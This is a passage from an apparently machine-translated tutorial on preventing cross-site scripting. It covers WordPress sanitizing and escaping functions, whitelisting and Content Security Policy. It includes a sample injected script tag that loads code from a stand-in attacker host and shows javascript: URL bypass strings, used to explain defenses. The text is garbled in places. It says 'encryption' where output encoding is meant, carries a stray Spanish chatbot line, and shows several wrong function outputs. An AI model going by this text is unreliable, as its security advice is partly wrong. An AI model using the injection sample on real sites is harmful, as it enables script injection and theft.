 | Strip & encode. | Remove labels with additional encoding flags. [ http://php.net/manual/en/filter.filters.sanitize.php ] |

**Let's see some cases with WordPress**

## WordPress API sanitizing functions

WordPress includes a variety of sanitization functions designed for specific use cases. We've included example uses below that give you an idea of how these functions change data.

| Function | Output | Description |
| --- | --- | --- |
| `absint('-123ABC')` | `123` | Sanitizes to positive integers. [Read more](https://codex.wordpress.org/Function_Reference/absint) |
| `sanitize_email("!#$%^&&*()__+=-{}||[:\"';<>?/.,test@example.com")` | `!#$%^&**__+=-{}|'?/.test@example.com` | Sanitizes e-mail addresses. [Read more](https://codex.wordpress.org/Function_Reference/sanitize_email) |
| `sanitize_file_name('.-_/path/to/file-name.txt');` | `path/to/file-name.txt` | Sanitizes file names. [Read more](https://codex.wordpress.org/Function_Reference/sanitize_file_name) |
| `sanitize_html_class('class!@#$%^&*()-name_here.');` | `class-name_here` | Sanitizes CSS class names. [Read more](https://codex.wordpress.org/Function_Reference/sanitize_html_class) |
| `sanitize_key('KeyName!@#$%^&*()<>,.?/');` | `keyName` | Sanitizes keys for associative arrays. [Read more](https://codex.wordpress.org/Function_Reference/sanitize_key) |
| `sanitize_mime_type('text/plain-blah!@#$%^&*()}{[]":;><,.?/');` | `text/plain-blah*./` | Sanitizes mime types. [Read more](https://codex.wordpress.org/Function_Reference/sanitize_mime_type) |
| `sanitize_option('thumbnail_size_h', '123ABC-_');` | `123` | WP sanitizes options. The type of filtering depends on the option name. [Read more](https://codex.wordpress.org/Function_Reference/sanitize_option) |
| `sanitize_sql_orderby('colName');` | `colName` | Sanitizes a column name used in SQL 'ORDER BY'. Returns blank if invalid characters are found. [Read more](https://codex.wordpress.org/Function_Reference/sanitize_sql_orderby) |
| `sanitize_text_field('<tag>some text</tag>')` | `some text` | Checks for invalid UTF-8, converts single `<` to entity, removes all tags, extra line breaks, tabs, and whitespace. [Read more](https://codex.wordpress.org/Function_Reference/sanitize_text_field) |
| `sanitize_title('<tag><?php //bla ?>Title here');` | `title-here` | Converts text to a slug-style title for use in a URL. [Read more](https://codex.wordpress.org/Function_Reference/sanitize_title) |
| `sanitize_user('<label>123ABCdef _.-*@name!#$', true);` | `123ABCdef _.-@name` | Sanitizes WP usernames. The second parameter allows strict sanitization. [Read more](https://codex.wordpress.org/Function_Reference/sanitize_user) |

### WordPress API Escape Functions

WordPress also includes escape functions for general use. The main functions are listed below, with input and output examples to illustrate their use.

| Function | Output | Comments |
| --- | --- | --- |
| `esc_html('<tag> & text');` | `<tag> &amp; text` | Escapes HTML for safe browser output. [Read more](https://codex.wordpress.org/Function_Reference/esc_html) |
| `esc_url('http://example.com/<script>alert("TEST");</script>');` | `http://example.com/`<script>alert("TEST");</script>` | Escapes URLs to be safe for output as text or HTML attributes. [Read more](https://codex.wordpress.org/Function_Reference/esc_url) |
| `esc_js('alert("1");');` | `alert("1");` | Escapes JavaScript for safe use in inline HTML, e.g., in an `onclick` handler. [Read more](https://codex.wordpress.org/Function_Reference/esc_js) |
| `esc_attr('attr-<>&\'"name');` | `attr-<>&\'"name` | Used to escape HTML attributes, e.g., `alt`, `title`, `value`, etc. [Read more](https://codex.wordpress.org/Function_Reference/esc_attr) |
| `esc_textarea('Text <tag> & text');` | `Text <tag> &amp; text` | Escapes text for output in the `<textarea>` element. [Read more](https://codex.wordpress.org/Function_Reference/esc_textarea) |

### The `wp_kses()`

wp_kses [()](https://codex.wordpress.org/Function_Reference/wp_kses) is a more complex sanitizing function. It removes bad scripts. That's where the name comes from: "kses removes bad hyphens". When using wp_kses() you will need to include an array of tags and the allowed attributes for each tag as a second parameter to kses. Here is an example:

| Line Numbers | Code |
| --- | --- |
| 1 | `$allowed = array(` |
| 2 | `   'a' => array( 'href' => array(), 'title' => array() ),` |
| 3 | `   'br' => array(),` |
| 4 | `   'em' => array(),` |
| 5 | `   'strong' => array(),` |
| 6 | `);` |
| 7 | `echo wp_kses($output, $allowed);` |

The above will allow the 'A' tag with the 'href' and 'title' attributes. It will also allow the following tags without attributes: br, em, and strong. If attributes with those tags are included, they will be removed.

`wp_kses()` is very processor-intensive because the code is complex. So, in general, we recommend that you first try to use the built-in PHP functions because they are faster, then the simpler WordPress cleanup and escape functions, and then only use `wp_kses()` if necessary. That will give you the best performance for your plugin or theme.

In Worpress, you must take steps to fix the problem. Here are some steps you can take:

- Update WordPress and plugins to the latest version: make sure WordPress and the plugins you are using are updated to the latest version. Developers often release security updates to address known vulnerabilities, including XSS vulnerabilities.
- Perform a security scan: Perform a full security scan on your site to identify any other vulnerabilities that may be present. There are several security scanning tools available online that can help you scan your site for vulnerabilities.
- Remove malicious code: If you find malicious code on your site, remove it immediately. Often, malicious XSS code can be found in your site's PHP or JavaScript files. Make sure you remove all malicious code and check all files to be sure.
- Reset all passwords: Change all passwords on your site, including the administrator password, and make sure they are strong and unique.
- Configure proper security policies: Properly configure your site's security policies to prevent attackers from exploiting XSS vulnerabilities. For example, you can configure content security policies to prevent malicious scripts from being uploaded.
- Use security plugins: Use reputable WordPress security plugins to protect your site against future XSS attacks. These plugins can help you detect and prevent security vulnerabilities, such as malicious script injection.

> ðŸ’¡ It is important to take quick action to fix an XSS vulnerability on your WordPress site, as attackers can use these vulnerabilities to take control of your site and steal sensitive data.

### Sort strategy

- **Blacklisting**

Instinctively, it seems reasonable to perform validation by defining a forbidden pattern that should not appear in user input. If a string matches this pattern, it is marked as invalid. An example would be to allow users to submit custom URLs with any protocol except javascript:. This sorting strategy is called *blacklisting*.

However, blacklisting has two major drawbacks:

- **Complexity**

Accurately describing the set of all possible malicious strings is often a very complex task. The example policy described above could not be successfully implemented by simply searching for the substring " javascript", because this would miss strings of the format " Javascript:" (where the first letter is capitalized) and " &#106;javascript:" (where the first letter is encoded as a character reference number).

- **Stagnation**.

Even if a perfect blacklist were developed, it would fail if a new feature were added to the browser that would allow malicious use. For example, an HTML validation blacklist developed before the introduction of the HTML5 onmousewheelatribute would fail to prevent an attacker from using that attribute to perform an XSS attack. This drawback is especially significant in web development, which is composed of many different technologies that are constantly being updated.

Because of these drawbacks, blacklisting as a classification strategy is strongly discouraged. Whitelisting is usually a much safer approach, as we will describe below.

- **Whitelisting**

*Whitelisting* is essentially the opposite of blacklisting: instead of defining a forbidden pattern, a whitelisting approach defines a permitted pattern and marks the entry as invalid if it does not *match* this pattern.

Unlike the above blacklisting example, a whitelisting example would be to allow users to submit custom URLs containing only the http: and https: protocols nothing else. This approach would automatically mark a URL as invalid if it had the javascript: protocol, even if it appeared as " Javascript:" or " &#106;javascript:".

Compared to blacklists, whitelists have two main advantages:

1. **Simplicity**: accurately describing a set of safe strings is usually much easier than identifying the set of all malicious strings. This is especially true in common situations where user input only needs to include a very limited subset of the functionality available in a browser. For example, the whitelist described above that allows only URLs with the http:or https:protocols is very simple and perfectly adequate for users in most situations.
2. **Longevity:** Unlike a blacklist, a whitelist will generally not become obsolete when a new feature is added to the browser. For example, an HTML validation whitelist that allows only title attributes in HTML elements would still be secure even if it were developed before the introduction of HTML5 onmousewheelattribute.

## Result of validation

When the input has been marked as invalid, one of two actions can be taken:

> Reject: the input is simply rejected, preventing it from being used elsewhere on the website.

> Sanitization: All invalid parts of the input are removed and the website uses the remaining input normally.

Of these two, rejection is the simpler approach to implement. That said, sanitization may be more useful as it allows for a wider range of user input. For example, if a user submits a credit card number, a sanitization routine that removes all characters other than digits would prevent code injection and allow the user to enter the number with or without dashes.

If you decide to implement sanitization, you must ensure that the sanitization routine itself does not use a blacklist approach. For example, the URL " Javascript:...", even when identified as invalid using a whitelisting approach, would pass a sanitization routine that simply removes all instances of " javascript:". For this reason, well-tested libraries and frameworks should be used for sanitization whenever possible.

### What prevention technique should you use?

Encryption should be your first line of defense against XSS because its purpose is to neutralize data so that it cannot be interpreted as code. In some cases, encryption must be supplemented with validation, as explained above. This encoding and validation must be salient, because only when the input is included on a page do you know for what context to encode and validate.

As a second line of defense, you must use inbound validation to sanitize or reject data that is invalid, such as links that use the javascript:protocol. While this alone cannot provide total security, it is a useful precaution if at some point outbound encryption and validation is performed incorrectly due to errors or mistakes.

> ðŸ‘‰ If these two lines of defense are used consistently, your website will be protected from XSS attacks. However, due to the complexity of creating and maintaining a complete website, it may be difficult to achieve full protection using only secure input handling. As a third line of defense, you should also make use of the Content Security Policy (CSP), which we will describe below.

### Content Security Policy (CSP)

The disadvantage of protecting against XSS using only secure input handling is that even a single security flaw can compromise your website. A recent web standard called Content Security Policy (CSP) can mitigate this risk.

CSP is used to restrict the browser from viewing your page so that it can only use resources downloaded from trusted sources. A *resource* is a script, style sheet, image, or some other type of file referenced by the page. This means that even if an attacker manages to inject malicious content into your website, CSP can prevent it from executing.

CSP (Content Security Policy) can be used to enforce the following rules:

- **No untrusted sources:** External resources can only be loaded from a clearly defined set of trusted sources.

- **No inline resources:** Inline JavaScript and CSS will not be evaluated.

- **No `eval`:** The JavaScript `eval` function cannot be used.

- **CSP in action:** In the following example, an attacker managed to inject malicious code into a page:

```html
<html>

Latest comment:

<script src="http://attacker/malicious-script.js"></script>

</html>
```

With a properly defined CSP policy, the browser would not load or execute malicious-script.jsbecause [http://attacker/no](http://attacker/no) would be in the trusted source set. Although in this case, the website could not securely handle user input, the CSP policy prevented the vulnerability from causing any damage.

Even if the attacker had injected the script code inline instead of linking it to an external file, a properly defined CSP policy that disallowed JavaScript inline would also have prevented the vulnerability from causing any harm.

### How to enable CSP?

By default, browsers do not enforce CSP. To enable CSP on your website, pages must have an additional HTTP header: Content-Security-Policy. Any page sent with this header will have its security policy respected by the browser that loads it, as long as the browser supports CSP.

Since the security policy is sent with each HTTP response, a server can set its policy on a page-by-page basis. The same policy can be applied to an entire website by providing the same CSP header in each response.

The value of the Content-Security-Policy-header is a string that defines one or more security policies that will take effect on your website. The syntax of this string will be described below.

*Sample headers in this section use newlines and indentation for clarity; this should not be present in an actual header.*

### CSP syntax

The syntax of a CSP header is as follows:

> Contentâ€‘Securityâ€‘Policy:
> 
> *directive* *sourceâ€‘expression*, *sourceâ€‘expression*, ...;
> 
> *directive* ...;
> 
> ...

This syntax is composed of two elements:

- **Directives** are strings specifying a resource type, taken from a predefined list.
- **Source expressions** are patterns describing one or more servers from which resources can be downloaded.

For each directive, the given source expressions define which sources can be used to download resources of the respective type.

### Directives

The directives that can be used in a CSP header are as follows:

- connect-src
- font-src
- frame-src
- img-src
- media-src
- object-src
- script-src
- style-src

In addition to these, the special default-srcse directive can be used to provide a default value for all directives that have not been included in the header.

**Source expressions**

The syntax of a source expression is as follows:

> protocol://host-name:port-number.

The host name may begin with *., which means that any subdomain of the provided host name will be allowed. Similarly, the port number can be *, which means that all ports will be allowed. In addition, the protocol and port number can be omitted. Finally, a protocol of your own can be given, allowing you to require that all resources be loaded via HTTPS.

In addition to the above syntax, a source expression can alternatively be one of four keywords with special meaning (quotation marks included):

AquÃ­ tienes el texto con un formato mejorado en Markdown:

- **'none'**  
  Does not allow resources.

- **'self'**  
  Allows resources from the host that served the page.

- **'unsafe-inline'**  
  Allows resources embedded in the page, such as inline `<script>` elements, `<style>` elements, and `javascript:URL`.

- **'unsafe-eval'**  
  Enables the use of the JavaScript `eval` function.

Note that whenever CSP is used, inline resources and evalno are automatically allowed by default. Using 'unsafe-inline'and 'unsafe-eval'is the only way to allow them.

**An example policy**

> Content-Security-Policy:
> 
> 
> script-src 'self' scripts.example.com;
> 
> media-src 'none';
> 
> img-src *;
> 
> default-src 'self' [http://*.example.com](about:blank)

In this example policy, the page is subject to the following restrictions:

- Scripts can only be downloaded from the host serving the page and from scripts.example.com.
- Audio and video files cannot be downloaded from anywhere.
- Image files can be downloaded from any host.
- All other resources can be downloaded only from the host serving the page and from any subdomain of example.com.

### CSP status

As of June 2013, the Content Security Policy is [a W3C candidate recommendation](http://www.w3.org/TR/CSP/). It is being implemented by browser vendors, but some parts are still browser-specific. In particular, the HTTP header to use may differ between browsers. Before using CSP today, consult the documentation of the browsers you want to support.

## Summary

Summary: Overview of XSS

- XSS is a code injection attack made possible by insecure handling of user input.
- A successful XSS attack allows an attacker to execute malicious JavaScript in the victim's browser.
- A successful XSS attack compromises the security of both the website and its users.

**Summary: XSS attacks**

- There are three main types of XSS attacks:
- Persistent XSS, where the malicious input originates in the website's database.
- Reflected XSS, where the malicious input originates from the victim's request.
- DOM-based XSS, where the vulnerability is in the client-side code instead of the server-side code.
- All of these attacks are performed in different ways, but have the same effect if successful.

**Summary: Preventing XSS**

- The most important way to prevent XSS attacks is to perform secure input handling.
- Most of the time, encryption must be performed whenever user input is included on a page.
- In some cases, encryption must be replaced or supplemented with validation.
- Secure input handling must take into account in which context of a page the user input is inserted.
- To avoid all types of XSS attacks, secure input handling must be performed in both client-side and server-side code.
- The content security policy provides an additional layer of defense when secure input handling fails.

### Conclusion

It should be noted that there is an overlap in the terminology currently used to describe XSS: a DOM-based XSS attack is also persistent or reflected at the same time; it is not a separate type of attack. No widely accepted terminology covers all types of XSS without overlap. However, regardless of the terminology used to describe XSS, the most important thing to identify about any attack is where the malicious input is coming from and where the vulnerability is located.

By following the basic guidelines on this page, you can avoid the most common vulnerabilities that are introduced into code. In general, spending time on input validation, output sanitization, and escape will make your application secure.

When choosing functions for sanitizing and escaping, choose the function that most closely matches your specific use case. If you are sending data to an HTML attribute, use a sanitization or escaping function specific to HTML attributes. This will give you the best combination of application performance and security.

If you can avoid XSS vulnerabilities and protect the output of your application, you will avoid almost half of all vulnerabilities that could be introduced into your application.

**REFERENCES**

- PHP's filter_var() documentation](http://php.net/manual/en/function.filter-var.php)
- PHP validation filters.](http://php.net/manual/en/filter.filters.validate.php)
- PHP sanitization filters.](http://php.net/manual/en/filter.filters.sanitize.php)
- [WordPress functions for sanitizing and escaping (article on Data Validation).](https://codex.wordpress.org/Data_Validation)
- Another WordPress article on user data validation, sanitizing and escaping.](https://codex.wordpress.org/Validating_Sanitizing_and_Escaping_User_Data)
- OWASP article on XSS.](https://www.owasp.org/index.php/Cross-site_Scripting_(XSS))
- OWASP XSS Cheatsheet](https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet)
- Google Application Security Article on XSS.](https://www.google.com/about/appsecurity/learning/xss/)
- [https://owasp.org/www-project-top-ten/2017/A7_2017-Cross-Site_Scripting_(XSS).html](https://owasp.org/www-project-top-ten/2017/A7_2017-Cross-Site_Scripting_(XSS).html)
- [https://cwe.mitre.org/data/definitions/79.html](https://cwe.mitre.org/data/definitions/79.html)
- [http://projects.webappsec.org/Cross-Site-Scripting](http://projects.webappsec.org/Cross-Site-Scripting)
- [https://owasp.org/Top10/A03_2021-Injection/](https://owasp.org/Top10/A03_2021-Injection/)
- [https://owasp.org/www-project-web-security-testing-guide](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/01-Testing_for_Reflected_Cross_Site_Scripting)
- [https://owasp.org/www-project-top-ten/2017/A7_2